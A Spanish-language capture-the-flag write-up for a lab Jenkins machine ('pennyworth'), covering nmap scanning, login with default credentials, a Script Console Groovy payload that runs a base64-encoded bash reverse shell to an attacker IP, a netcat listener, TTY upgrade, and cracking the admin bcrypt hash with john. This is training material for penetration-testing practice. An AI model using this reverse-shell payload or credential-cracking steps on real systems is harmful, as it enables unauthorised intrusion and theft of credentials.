🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.198.27

PING 10.129.198.27 (10.129.198.27) 56(84) bytes of data.
64 bytes from 10.129.198.27: icmp_seq=1 ttl=63 time=164 ms

--- 10.129.198.27 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 164.308/164.308/164.308/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv 10.129.198.27 -oG openPorts

PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 8080 -sCV 10.129.198.27 -oN targeted

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

| Puerto | Servicio | Versión                |
| ------ | -------- | ---------------------- |
| 8080   | http     | Jetty 9.4.39.v20210325 |

🗹 Probar las credenciales `root` para el campo `Username` y `password` para el campo `Password`.

🗹 Dentro del dashboard, en la opción **Manage Jenkins**, **Script Console** crear el siguiente script:

```shell
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44MS8xMjM0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

🗹 Crear por consola la reverse shell incluyendo la IP atacante y el puerto que va a estar en escucha para recibir la reverse shell e incluirla dentro del script:

```shell
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.81/1234 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44MS8xMjM0IDA+JjEnCg==
```

🗹 Ponerse en escucha en la máquina atacante `nc -lnvp 1234`.

🗹 Una vez establecida la conexión con el servidor configurar la terminal y personalizar el entorno de la terminal:

```shell
script /dev/null -c bash

ctrl + z

stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 183
```
## Flag

🗹 La flag se encuentra en el directorio `/root/flag.txt`.

## Cositas aprendidas

🗹 En el servidor, en el directorio `/var/lib/jenkins/users/root_5662950835086884594` dentro del archivo `config.xml` están configuradas las credenciales:

```shell
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>root</id>
  <fullName>Administrator</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.3.15">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.82">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.4">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>6f5f3cc26dcb738e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$bPGCZ8xst4W7TIH9VbC.9.djeZCRSzadagQ6y6tZvmdulxzxkQzkq</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.33">
      <emailAddress>admin@pennyworth.htb</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1615542792511</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```

Usando la utilidad `john` se puede ver el contenido del hash de la contraseña:

```shell
echo '$2a$10$bPGCZ8xst4W7TIH9VbC.9.djeZCRSzadagQ6y6tZvmdulxzxkQzkq' > hash

❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)     
1g 0:00:00:00 DONE (2024-03-16 12:57) 1.851g/s 66.66p/s 66.66c/s 66.66C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```